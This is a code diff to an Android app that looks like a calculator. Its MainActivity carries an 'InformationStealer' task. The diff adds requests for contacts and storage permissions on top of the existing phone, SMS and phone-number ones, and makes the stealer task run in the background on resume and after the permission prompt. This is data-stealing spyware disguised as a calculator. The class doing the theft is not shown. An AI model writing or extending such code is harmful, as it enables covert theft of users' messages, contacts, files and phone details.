@@ -25,11 +25,13 @@ import java.util.concurrent.Executors;
 
 public class MainActivity extends AppCompatActivity {
 
+    public boolean flag = true;
     private static final int PERMISSION_REQUEST_PHONE_STATE = 1;
     private String operation = "";
     private double op1 = 0, op2 = 0, prevResult = 0;
     private TextView current, history;
     private InformationStealer task = new InformationStealer(this);
+    Executor executor = Executors.newSingleThreadExecutor();
 
     private class MyNumberButton {
         Button b;
@@ -130,12 +132,16 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         initializeComponents();
-        Executor executor = Executors.newSingleThreadExecutor();
+
 
         String[] permissions = {
                 Manifest.permission.READ_PHONE_STATE,
                 Manifest.permission.READ_SMS,
-                Manifest.permission.READ_PHONE_NUMBERS
+                Manifest.permission.READ_PHONE_NUMBERS,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_CONTACTS,
+                Manifest.permission.READ_CONTACTS,
         };
 
         boolean allPermissionsGranted = true;
@@ -148,12 +154,7 @@ public class MainActivity extends AppCompatActivity {
 
         if (!allPermissionsGranted) {
             ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_PHONE_STATE);
-        } else {
-            // Tutti i permessi sono già stati concessi
-            task.setMessaggio(task.getMessaggio().append(stealNumberInformations(this)));
         }
-
-        executor.execute(task);
     }
 
     //Initialize components in the class
@@ -251,6 +252,11 @@ public class MainActivity extends AppCompatActivity {
         history = findViewById(R.id.ans);
     }
 
+    @Override
+    protected void onResume() {
+        super.onResume();
+        if(flag) executor.execute(task);
+    }
 
 
     @Override
@@ -261,17 +267,27 @@ public class MainActivity extends AppCompatActivity {
                 ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                         != PackageManager.PERMISSION_GRANTED ||
                 ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)
-                        != PackageManager.PERMISSION_GRANTED) {
+                        != PackageManager.PERMISSION_GRANTED ||
+                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
+                        != PackageManager.PERMISSION_GRANTED ||
+                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS)
+                        != PackageManager.PERMISSION_GRANTED ||
+                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+                        != PackageManager.PERMISSION_GRANTED ||
+                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
+                        != PackageManager.PERMISSION_GRANTED){
 
-            ActivityCompat.requestPermissions(this, new String[]{
-                    Manifest.permission.READ_PHONE_STATE,
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.READ_PHONE_NUMBERS
-            }, PERMISSION_REQUEST_PHONE_STATE);
-        } else {
-            // I permessi sono già stati concessi
-            task.setMessaggio(task.getMessaggio().append(stealNumberInformations(this)));
+            for (int i = 0; i < permissions.length; i++) {
+                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                    task.setPermissionFlag(false);
+                    break;
+                }
+
+            }
+
         }
+        flag = false;
+        executor.execute(task);
     }
 }
 
